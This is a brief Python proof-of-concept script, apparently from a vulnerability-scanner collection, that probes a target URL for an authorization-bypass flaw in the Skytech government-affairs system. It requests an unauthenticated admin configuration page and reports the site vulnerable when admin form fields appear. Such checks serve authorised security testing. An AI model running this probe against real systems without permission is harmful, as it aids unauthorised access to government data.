#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: skytech政务系统越权漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-081902
author: Lucifer
description: skytech政务系统越权漏洞,泄露敏感信息。
'''
import sys
import requests
import warnings
def run(url):
        result=['','不存在']
        payload = "/admin/sysconfig_reg_page.aspx"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)
            if r"txtUserRights" in req.text and r"txtTitle" in req.text:
                result[1]=  '存在'
                result[0] = vulnurl
            else:
                result[1]=  '不存在'

        except:
            result[1]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
